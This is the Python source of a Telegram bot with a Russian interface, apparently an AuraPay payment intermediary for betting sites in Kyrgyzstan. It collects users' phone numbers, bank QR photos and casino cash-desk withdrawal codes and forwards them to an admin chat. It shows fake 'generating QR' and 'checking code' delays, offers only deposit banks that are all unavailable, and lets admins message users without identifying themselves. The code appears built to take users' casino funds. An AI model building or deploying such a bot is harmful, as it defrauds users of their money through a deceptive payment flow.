import os
import asyncio
import random
import logging
from telegram import (
    Update, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, ConversationHandler, filters
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN     = os.getenv("BOT_TOKEN", "")
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", "0"))
ADMIN_IDS     = list(map(int, os.getenv("ADMIN_IDS", "0").split(",")))

blocked_users = set()
qr_mode       = False
pending_qr    = None  # file_id QR

# ── состояния ──────────────────────────────────────────────────────────────
(
    DEP_CASINO, DEP_ID, DEP_AMOUNT,
    WD_CASINO, WD_BANK, WD_PHONE, WD_QR, WD_CID, WD_CODE,
    ADM_QR,
) = range(10)

# ── главная клавиатура (синие кнопки через ReplyKeyboard) ──────────────────
def main_kb():
    return ReplyKeyboardMarkup(
        [[KeyboardButton("💰 Пополнить"), KeyboardButton("💸 Вывести")],
         [KeyboardButton("📖 Инструкция"), KeyboardButton("🌐 Язык")]],
        resize_keyboard=True
    )

# ── казино (inline) ────────────────────────────────────────────────────────
def casino_ikb(prefix):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("1️⃣ 1xBet",  callback_data=f"{prefix}_1xBet")],
        [InlineKeyboardButton("🎰 Melbet",  callback_data=f"{prefix}_Melbet"),
         InlineKeyboardButton("🎰 1win",    callback_data=f"{prefix}_1win")],
        [InlineKeyboardButton("🎰 mostbet", callback_data=f"{prefix}_mostbet")],
    ])

# ── суммы пополнения ───────────────────────────────────────────────────────
def amount_ikb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💵 100",   callback_data="amt_100"),
         InlineKeyboardButton("💵 500",   callback_data="amt_500"),
         InlineKeyboardButton("💵 1000",  callback_data="amt_1000")],
        [InlineKeyboardButton("💵 5000",  callback_data="amt_5000"),
         InlineKeyboardButton("💵 10000", callback_data="amt_10000")],
    ])

# ── банки пополнения (недоступны) ──────────────────────────────────────────
def dep_bank_payment_ikb():
    """Банки показываются ПОСЛЕ QR — для выбора способа оплаты (все недоступны)."""
    banks = ["O!Bank", "MBank", "Optima Bank", "Demir Bank", "Bakai Bank", "MegaPay"]
    rows = []
    for i in range(0, len(banks), 2):
        row = []
        for b in banks[i:i+2]:
            row.append(InlineKeyboardButton(f"🏦 {b} 🚫", callback_data=f"depbank_{b}"))
        rows.append(row)
    return InlineKeyboardMarkup(rows)

# ── банки вывода ───────────────────────────────────────────────────────────
def wd_bank_ikb():
    banks = [("Компаньон","kompanyon"), ("O банк","obank"),
             ("Bakai","bakai"),         ("Balance.kg","balance"),
             ("MegaPay","megapay"),     ("MBank","mbank")]
    rows = []
    for i in range(0, len(banks), 2):
        row = [InlineKeyboardButton(f"🏦 {n}", callback_data=f"wdbank_{c}")
               for n, c in banks[i:i+2]]
        rows.append(row)
    return InlineKeyboardMarkup(rows)

# ── язык ───────────────────────────────────────────────────────────────────
def lang_ikb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🇷🇺 Русский",   callback_data="lang_ru")],
        [InlineKeyboardButton("🇰🇬 Кыргызча", callback_data="lang_ky")],
        [InlineKeyboardButton("🇺🇿 O'zbekcha", callback_data="lang_uz")],
    ])

# ── админ кнопки под заявкой ───────────────────────────────────────────────
def admin_ikb(uid):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Одобрить",       callback_data=f"approve_{uid}"),
         InlineKeyboardButton("❌ Отклонить",      callback_data=f"decline_{uid}")],
        [InlineKeyboardButton("✍️ Написать",       callback_data=f"awrite_{uid}"),
         InlineKeyboardButton("🚫 Заблокировать",  callback_data=f"ablock_{uid}")],
        [InlineKeyboardButton("🔓 Разблокировать", callback_data=f"aunblock_{uid}")],
    ])

# ── уведомление админу ─────────────────────────────────────────────────────
async def notify_admin(app, text, uid, photo=None):
    if not ADMIN_CHAT_ID:
        return
    try:
        if photo:
            await app.bot.send_photo(ADMIN_CHAT_ID, photo=photo,
                                     caption=text, reply_markup=admin_ikb(uid),
                                     parse_mode="HTML")
        else:
            await app.bot.send_message(ADMIN_CHAT_ID, text,
                                       reply_markup=admin_ikb(uid),
                                       parse_mode="HTML")
    except Exception as e:
        logger.error(e)

# ════════════════════════════════════════════════════════════════════════════
#  /start
# ════════════════════════════════════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in blocked_users:
        await update.message.reply_text("❌ Вы заблокированы.")
        return ConversationHandler.END
    name = update.effective_user.full_name
    await update.message.reply_text(
        f"Привет, {name}\n\n"
        "⚡ Авто-пополнение: 0%\n"
        "⚡ Авто-вывод: 0%\n"
        "🌟 Работаем: 24/7\n\n"
        "💬 Служба поддержки: @aurapay_support_bot",
        reply_markup=main_kb()
    )
    return ConversationHandler.END

# ── Инструкция / Язык ──────────────────────────────────────────────────────
async def cmd_instruction(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 <b>Инструкция по использованию бота</b>\n\n"
        "💰 <b>ПОПОЛНЕНИЕ:</b>\n"
        "1. Нажмите «Пополнить»\n2. Выберите казино\n"
        "3. Введите ID вашего счёта\n4. Введите сумму\n5. Оплатите по QR\n\n"
        "💸 <b>ВЫВОД:</b>\n"
        "1. Нажмите «Вывести»\n2. Выберите казино\n3. Выберите банк\n"
        "4. Введите номер телефона (+996)\n5. Отправьте фото QR кода от банка\n"
        "6. Введите ID счёта в казино\n7. Введите код с сайта казино\n\n"
        "Ваша заявка будет обработана в ближайшее время!",
        parse_mode="HTML", reply_markup=main_kb()
    )

async def cmd_language(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🌐 Выберите язык:", reply_markup=lang_ikb())

async def cb_lang(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer("✅ Язык выбран")

# ════════════════════════════════════════════════════════════════════════════
#  ПОПОЛНЕНИЕ
# ════════════════════════════════════════════════════════════════════════════
async def dep_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in blocked_users:
        await update.message.reply_text("❌ Вы заблокированы.")
        return ConversationHandler.END
    await update.message.reply_text("🎰 Выберите букмекер:", reply_markup=casino_ikb("dep"))
    return DEP_CASINO

async def dep_casino(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    casino = q.data.split("dep_")[1]
    ctx.user_data["dep_casino"] = casino
    await q.edit_message_text(
        f"🎰 Казино: <b>{casino}</b>\n\n"
        "📋 Проверьте ваш ID ещё раз\n"
        "❌ Отменить пополнение нельзя!!\n\n"
        f"▶▶▶ Отправьте ID вашего счёта {casino}:",
        parse_mode="HTML"
    )
    return DEP_ID

async def dep_id(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data["dep_id"] = update.message.text
    # Сразу просим ввести сумму — банки покажем ПОСЛЕ
    await update.message.reply_text(
        "🚀 Введите сумму пополнения:\n"
        "📌 Min: 100\n"
        "📌 Max: 100 000",
        reply_markup=amount_ikb()
    )
    return DEP_AMOUNT

async def dep_amount_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    amount = q.data.split("amt_")[1]
    ctx.user_data["dep_amount"] = amount
    await q.edit_message_reply_markup()
    await _process_deposit(update, ctx, amount, q.message)
    return ConversationHandler.END

async def dep_amount_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    txt = update.message.text
    if not txt.isdigit():
        await update.message.reply_text("⚠️ Введите число.")
        return DEP_AMOUNT
    amount = txt
    ctx.user_data["dep_amount"] = amount
    await _process_deposit(update, ctx, amount, update.message)
    return ConversationHandler.END

async def _process_deposit(update, ctx, amount, msg_obj):
    casino    = ctx.user_data.get("dep_casino", "")
    casino_id = ctx.user_data.get("dep_id", "")
    uid       = update.effective_user.id

    # Анимация 2-3 сек
    gen = await msg_obj.reply_text("⏳ Генерирую QR...")
    await asyncio.sleep(random.uniform(2, 3))
    await gen.delete()

    caption = (
        f"💳 Сумма к оплате: <b>{amount} сом</b>\n"
        f"🎰 Казино: {casino}\n"
        f"🆔 ID: {casino_id}\n\n"
        "📌 Проверьте ваш ID ещё раз\n"
        "❌ Отменить пополнение нельзя!!"
    )

    # Показываем QR + банки для оплаты
    if qr_mode and pending_qr:
        await msg_obj.reply_photo(
            photo=pending_qr,
            caption=caption + "\n\n🏦 Выберите банк для оплаты:",
            parse_mode="HTML",
            reply_markup=dep_bank_payment_ikb()
        )
    else:
        await msg_obj.reply_text(
            caption + "\n\n⚠️ QR не настроен. Используйте /qr чтобы загрузить QR-код.\n\n🏦 Выберите банк для оплаты:",
            parse_mode="HTML",
            reply_markup=dep_bank_payment_ikb()
        )

    # Уведомление админу
    notif = (
        f"🆕 <b>ЗАЯВКА НА ПОПОЛНЕНИЕ</b>\n\n"
        f"👤 <a href='tg://user?id={uid}'>{update.effective_user.full_name}</a>\n"
        f"🆔 Chat ID: <code>{uid}</code>\n"
        f"🎰 Казино: {casino}\n"
        f"🎫 ID счёта: <code>{casino_id}</code>\n"
        f"💰 Сумма: {amount} сом"
    )
    await notify_admin(ctx.application, notif, uid)

# недоступный банк — алерт
async def dep_bank_alert(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.callback_query.answer("⛔ Данный банк недоступен!", show_alert=True)

# ════════════════════════════════════════════════════════════════════════════
#  ВЫВОД
# ════════════════════════════════════════════════════════════════════════════
async def wd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id in blocked_users:
        await update.message.reply_text("❌ Вы заблокированы.")
        return ConversationHandler.END
    await update.message.reply_text("🎰 Выберите букмекер:", reply_markup=casino_ikb("wd"))
    return WD_CASINO

async def wd_casino(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    casino = q.data.split("wd_")[1]
    ctx.user_data["wd_casino"] = casino
    await q.edit_message_text(
        f"🎰 Казино: <b>{casino}</b>\n\n🏦 Выберите банк:",
        parse_mode="HTML", reply_markup=wd_bank_ikb()
    )
    return WD_BANK

async def wd_bank(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    bank_map = {
        "kompanyon": "Компаньон", "obank": "O банк",
        "bakai": "Bakai", "balance": "Balance.kg",
        "megapay": "MegaPay", "mbank": "MBank"
    }
    bank = bank_map.get(q.data.replace("wdbank_", ""), q.data)
    ctx.user_data["wd_bank"] = bank
    casino = ctx.user_data.get("wd_casino", "")
    await q.edit_message_text(
        f"🎰 Казино: {casino}\n🏦 Банк: {bank}\n\n📱 Введите номер телефона (+996):"
    )
    return WD_PHONE

async def wd_phone(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data["wd_phone"] = update.message.text
    await update.message.reply_text("📷 Отправьте фото QR кода от банка:")
    return WD_QR

async def wd_qr(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message.photo:
        await update.message.reply_text("📷 Пожалуйста, отправьте именно фото QR кода.")
        return WD_QR
    ctx.user_data["wd_qr"] = update.message.photo[-1].file_id
    casino = ctx.user_data.get("wd_casino", "")
    await update.message.reply_text(
        "▶▶▶ Заходим 👇\n"
        "1. Настройки!\n2. Вывести со счёта!\n3. Касса\n"
        "4. Сумму для Вывода!\nг. Бишкек, офис AuraPay\n"
        f"5. Подтвердить\n6. Получить Код!\n7. Отправить его нам\n\n"
        f"🆔 Введите ID вашего счёта {casino}:"
    )
    return WD_CID

async def wd_cid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data["wd_cid"] = update.message.text
    await update.message.reply_text("🔑 Введите код с сайта казино:")
    return WD_CODE

async def wd_code(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    code = update.message.text
    uid  = update.effective_user.id

    check = await update.message.reply_text("🔍 Проверяю код...")
    await asyncio.sleep(random.uniform(1, 2))
    await check.delete()

    await update.message.reply_text(
        "✅ Заявка отправлена на рассмотр.\n⏳ Ожидайте ответа бота.",
        reply_markup=main_kb()
    )

    casino = ctx.user_data.get("wd_casino", "")
    bank   = ctx.user_data.get("wd_bank", "")
    phone  = ctx.user_data.get("wd_phone", "")
    cid    = ctx.user_data.get("wd_cid", "")
    qr_fid = ctx.user_data.get("wd_qr", "")

    notif = (
        f"🆕 <b>ЗАЯВКА НА ВЫВОД</b>\n\n"
        f"👤 <a href='tg://user?id={uid}'>{update.effective_user.full_name}</a>\n"
        f"🆔 Chat ID: <code>{uid}</code>\n"
        f"🎰 Казино: {casino}\n🏦 Банк: {bank}\n"
        f"📱 Телефон: {phone}\n"
        f"🎫 ID счёта: <code>{cid}</code>\n"
        f"🔑 Код: <code>{code}</code>"
    )
    await notify_admin(ctx.application, notif, uid, photo=qr_fid or None)
    return ConversationHandler.END

# ════════════════════════════════════════════════════════════════════════════
#  Отмена
# ════════════════════════════════════════════════════════════════════════════
async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Операция отменена.", reply_markup=main_kb())
    return ConversationHandler.END

# ════════════════════════════════════════════════════════════════════════════
#  ADMIN /qr — загрузить QR
# ════════════════════════════════════════════════════════════════════════════
async def cmd_qr(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Нет доступа.")
        return ConversationHandler.END
    global qr_mode
    qr_mode = True
    await update.message.reply_text(
        "📲 Отправьте фото QR-кода, который будут видеть пользователи при оплате:"
    )
    return ADM_QR

async def adm_set_qr(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return ConversationHandler.END
    if not update.message.photo:
        await update.message.reply_text("📷 Отправьте именно фото QR-кода.")
        return ADM_QR
    global pending_qr
    pending_qr = update.message.photo[-1].file_id
    await update.message.reply_text("✅ QR-код сохранён! Теперь пользователи видят его при пополнении.")
    return ConversationHandler.END

# ════════════════════════════════════════════════════════════════════════════
#  ADMIN /cob — написать пользователю
# ════════════════════════════════════════════════════════════════════════════
async def cmd_cob(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return
    parts = update.message.text.split(maxsplit=2)
    if len(parts) >= 3:
        try:
            # Просто отправляем текст — без заголовка "от администратора"
            await ctx.bot.send_message(int(parts[1]), parts[2])
            await update.message.reply_text("✅ Сообщение отправлено!")
        except Exception as e:
            await update.message.reply_text(f"❌ Ошибка: {e}")
    else:
        await update.message.reply_text(
            "Использование: /cob <chat_id> <текст>\n"
            "Пример: /cob 123456789 Ваша заявка одобрена!"
        )

# ════════════════════════════════════════════════════════════════════════════
#  ADMIN callback кнопки
# ════════════════════════════════════════════════════════════════════════════
async def cb_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if update.effective_user.id not in ADMIN_IDS:
        await q.answer("❌ Нет доступа", show_alert=True)
        return

    data = q.data

    if data.startswith("approve_"):
        uid = int(data.split("approve_")[1])
        try:
            await ctx.bot.send_message(uid, "✅ Ваша заявка одобрена!")
        except:
            pass
        await q.answer("✅ Одобрено", show_alert=True)

    elif data.startswith("decline_"):
        uid = int(data.split("decline_")[1])
        try:
            await ctx.bot.send_message(uid, "❌ Ваша заявка отклонена.")
        except:
            pass
        await q.answer("❌ Отклонено", show_alert=True)

    elif data.startswith("ablock_"):
        uid = int(data.split("ablock_")[1])
        blocked_users.add(uid)
        await q.answer(f"🚫 Пользователь {uid} заблокирован", show_alert=True)

    elif data.startswith("aunblock_"):
        uid = int(data.split("aunblock_")[1])
        blocked_users.discard(uid)
        await q.answer(f"✅ Пользователь {uid} разблокирован", show_alert=True)

    elif data.startswith("awrite_"):
        uid = int(data.split("awrite_")[1])
        await q.answer()
        await q.message.reply_text(
            f"✍️ Используйте команду:\n/cob {uid} ваше_сообщение"
        )

# ════════════════════════════════════════════════════════════════════════════
#  Запуск
# ════════════════════════════════════════════════════════════════════════════
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # ConversationHandler для пополнения
    dep_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^💰 Пополнить$"), dep_start)],
        states={
            DEP_CASINO: [CallbackQueryHandler(dep_casino, pattern="^dep_")],
            DEP_ID:     [MessageHandler(filters.TEXT & ~filters.COMMAND, dep_id)],
            DEP_AMOUNT: [
                CallbackQueryHandler(dep_amount_cb, pattern="^amt_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, dep_amount_text),
            ],
        },
        fallbacks=[MessageHandler(filters.Regex("^❌"), cancel)],
        allow_reentry=True,
    )

    # ConversationHandler для вывода
    wd_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^💸 Вывести$"), wd_start)],
        states={
            WD_CASINO: [CallbackQueryHandler(wd_casino, pattern="^wd_")],
            WD_BANK:   [CallbackQueryHandler(wd_bank, pattern="^wdbank_")],
            WD_PHONE:  [MessageHandler(filters.TEXT & ~filters.COMMAND, wd_phone)],
            WD_QR:     [MessageHandler(filters.PHOTO | filters.TEXT, wd_qr)],
            WD_CID:    [MessageHandler(filters.TEXT & ~filters.COMMAND, wd_cid)],
            WD_CODE:   [MessageHandler(filters.TEXT & ~filters.COMMAND, wd_code)],
        },
        fallbacks=[MessageHandler(filters.Regex("^❌"), cancel)],
        allow_reentry=True,
    )

    # ConversationHandler для /qr
    qr_conv = ConversationHandler(
        entry_points=[CommandHandler("qr", cmd_qr)],
        states={ADM_QR: [MessageHandler(filters.PHOTO | filters.TEXT, adm_set_qr)]},
        fallbacks=[],
        allow_reentry=True,
    )

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("cob",   cmd_cob))
    app.add_handler(qr_conv)
    app.add_handler(dep_conv)
    app.add_handler(wd_conv)
    app.add_handler(MessageHandler(filters.Regex("^📖 Инструкция$"), cmd_instruction))
    app.add_handler(MessageHandler(filters.Regex("^🌐 Язык$"),       cmd_language))
    app.add_handler(MessageHandler(filters.Regex("^❌"),              cancel))
    app.add_handler(CallbackQueryHandler(cb_lang,       pattern="^lang_"))
    app.add_handler(CallbackQueryHandler(dep_bank_alert,pattern="^depbank_"))
    app.add_handler(CallbackQueryHandler(cb_admin,      pattern="^(approve|decline|ablock|aunblock|awrite)_"))

    logger.info("✅ Bot started!")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
